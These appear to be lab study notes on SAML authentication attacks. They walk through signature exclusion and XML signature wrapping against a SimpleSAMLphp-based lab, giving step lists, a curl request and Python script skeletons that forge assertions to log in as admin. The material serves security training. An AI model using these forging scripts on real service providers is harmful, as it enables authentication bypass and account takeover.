# SAML Attacks

SAML assertions are signed XML documents. The attacks exploit gaps in how the service provider (SP) validates XML signatures — either by not requiring them, or by validating one part of the document while reading attributes from another.

---

## Understanding the SAML Flow

The lab uses SimpleSAMLphp as the IdP. The flow:

1. `GET /login.php` on the SP → SP redirects to the IdP's SSO endpoint with a base64+deflate-encoded `SAMLRequest`.
2. IdP renders `loginuserpass.php` with an `AuthState` token in a hidden field. The HTML-encodes the value (`&amp;` for `&`) — decode it before submitting.
3. `POST` `username`, `password`, `AuthState` to the IdP login handler.
4. IdP responds with an HTML auto-POST page containing the `SAMLResponse` (base64-encoded XML) and `RelayState`.
5. The browser posts these to the SP's ACS (Assertion Consumer Service) endpoint — in the lab this is `/acs.php`.
6. SP decodes the SAMLResponse, validates the signature, and reads attributes from the assertion.

The assertion XML contains user attributes:
```xml
<saml:Attribute Name="id"><saml:AttributeValue>1234</saml:AttributeValue></saml:Attribute>
<saml:Attribute Name="name"><saml:AttributeValue>htb-stdnt</saml:AttributeValue></saml:Attribute>
<saml:Attribute Name="email"><saml:AttributeValue>student@academy.htb</saml:AttributeValue></saml:Attribute>
```

---

## Signature Exclusion

**Vulnerability:** The SP only validates the XML signature *if one is present*. If you strip all `<ds:Signature>` elements, the SP skips verification and trusts whatever attributes are in the assertion.

**Steps:**
1. Walk the IdP login flow as your own user to capture a valid signed SAMLResponse.
2. Base64-decode the `SAMLResponse`.
3. Strip every `<ds:Signature>…</ds:Signature>` block — there may be both a response-level and an assertion-level signature.
4. Modify the attribute values you want to change (e.g., `name` → `admin`).
5. Re-encode the modified XML in base64.
6. POST to `/acs.php`:
   ```bash
   curl -s -X POST "http://academy.htb/acs.php" \
     --data-urlencode "SAMLResponse=<base64>" \
     --data-urlencode "RelayState=/acs.php" \
     -c cookies.txt
   ```

**Why it works:** The check is `if (response.has_signature) { verify() }`. No enforcement of "signature is required". SP trusts unsigned assertions the same as signed ones.

**Script skeleton:**
```python
import requests, base64, re

# 1. Walk IdP login, capture SAMLResponse
# ... (see full chain in lab notes)

# 2. Decode + strip signatures + modify
xml = base64.b64decode(saml_response).decode()
xml = re.sub(r'<ds:Signature.*?</ds:Signature>', '', xml, flags=re.DOTALL)
xml = xml.replace('>htb-stdnt<', '>admin<')

# 3. Re-encode + POST to ACS
new_response = base64.b64encode(xml.encode()).decode()
r = requests.post(f"http://academy.htb/acs.php",
    data={"SAMLResponse": new_response, "RelayState": "/acs.php"},
    cookies=sp_cookies)
```

---

## Signature Wrapping (XSW)

**Vulnerability:** The XML signature verifier and the application attribute parser look at different nodes. The signature refers to the assertion by ID (`URI="#X"`). If you inject a second assertion *before* the signed one, the parser reads the first assertion (unsigned, attacker-controlled) while the verifier validates the second (original, still valid).

**The structural mismatch:**
- Verifier: finds `<ds:Reference URI="#originalID">` → validates that exact node → passes.
- Attribute reader: takes the *first* `<saml:Assertion>` it finds in the document.

**Steps:**
1. Capture a valid signed SAMLResponse as above.
2. Decode the XML, locate the original `<saml:Assertion ID="originalID">`.
3. Clone the entire assertion into a new element:
   - Remove the inner `<ds:Signature>` from the clone.
   - Change the clone's assertion ID to something else (e.g., `ID="_evilID"`) to avoid duplicate IDs.
   - Rewrite the attributes in the clone: `id=1`, `name=admin`, `email=admin@academy.htb`.
4. Insert the clone **before** the original assertion as a sibling under `<samlp:Response>`.
5. The original assertion (with its valid signature) stays untouched.
6. Base64-encode and POST to ACS.

**Script skeleton:**
```python
from lxml import etree
import base64, copy

NS = {
    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
    'saml':  'urn:oasis:names:tc:SAML:2.0:assertion',
    'ds':    'http://www.w3.org/2000/09/xmldsig#'
}

xml_bytes = base64.b64decode(saml_response)
root = etree.fromstring(xml_bytes)

# Find original assertion
orig_assertion = root.find('.//saml:Assertion', NS)

# Clone and modify
evil = copy.deepcopy(orig_assertion)
evil.set('ID', '_evilID')

# Strip inner signature from clone
sig = evil.find('ds:Signature', NS)
if sig is not None:
    evil.remove(sig)

# Rewrite attributes
for attr in evil.findall('.//saml:Attribute', NS):
    name = attr.get('Name')
    val = attr.find('saml:AttributeValue', NS)
    if name == 'id':    val.text = '1'
    if name == 'name':  val.text = 'admin'
    if name == 'email': val.text = 'admin@academy.htb'

# Insert evil assertion BEFORE the original
response_node = root  # or the samlp:Response element
response_node.insert(list(response_node).index(orig_assertion), evil)

tampered = base64.b64encode(etree.tostring(root)).decode()
```

**Why it works:** The XPath expression the verifier uses (`id()`) resolves ID references uniquely per the XML spec. If you don't change the signed assertion's ID, the verifier still finds the right node. The attribute reader just reads sequentially — it gets the first `<saml:Assertion>` it encounters.

---

## Common Pitfalls

- **AuthState HTML-encoding:** The hidden field `AuthState` in SimpleSAMLphp contains `&amp;` in the HTML source. You must HTML-decode it (`&amp;` → `&`) before including it in the form POST, or the IdP won't find the authentication state and will return an error.
- **RelayState value:** In these labs, use `/acs.php` as the RelayState. Some SPs are lenient; others reject a RelayState that doesn't match a known path.
- **XML namespace prefixes:** Different parsers may re-serialize namespaces differently. If your XSW tampered assertion comes out with namespace declarations on every element, the SP might reject it. Use `lxml`'s `cleanup_namespaces()` or verify the SP is lenient about namespace declarations.
- **Whitespace in base64:** Some parsers choke on base64-encoded SAMLResponses with embedded newlines. Use `base64.b64encode(...).decode()` without linebreaks (Python's default is fine; `openssl base64` adds newlines by default — use `openssl base64 -A` or Python).
